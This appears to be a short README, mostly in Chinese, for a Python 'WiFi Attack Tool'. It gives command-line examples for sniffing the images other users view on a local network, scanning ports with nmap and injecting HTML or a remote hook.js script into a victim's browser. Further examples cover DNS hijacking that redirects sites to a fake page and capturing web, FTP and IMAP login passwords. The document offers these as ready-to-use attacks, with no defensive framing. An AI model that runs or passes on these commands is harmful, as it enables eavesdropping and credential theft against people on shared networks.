A WiFi Attack Tool

1.监听局域网内的其他用户查看的图片信息：
	python WifiAttack.py -u -p -d -ip 192.168.0.10
如果无法识别MAC地址，则加参数--vmac
	python WifiAttack.py -u -p -d -ip 192.168.0.10 -vmac xx:xx:xx:xx:xx
监听整个C段图片信息：
	python WifiAttack.py -u -p -d -ip 192.168.0.0/24
使用到的工具Driftnet//自动加载图片捕捉工具

2.利用nmap扫描端口：//调用nmap模块进行扫描
	python WifiAttack.py -n -ip 192.168.1.110

3.代码&js注入到目标主机
	python WifiAttack.py -c "html代码" -ip 192.168.1.110 //将html代码注入到192.168.1.110
	python WifiAttack.py -b http://192.168.1.10:3000/hook.js -ip 192.168.1.110// 将js代码注入到192.168.1.110受害电脑


4.DNS劫持//将目标主机的DNS重定向到某一虚假页面

	python WifiAttack.py -a -r 192.168.200.109 -ip 192.168.200.4//重定向任意网站域名到192.168.200.109

5.抓取web的登录信息，GET/POST;抓取ftp的密码信息。
	python WifiAttack.py -p -ip 192.168.200.4 //劫持192.168.200.4的web登录密码，ftp登录密码，IMAP的登录密码。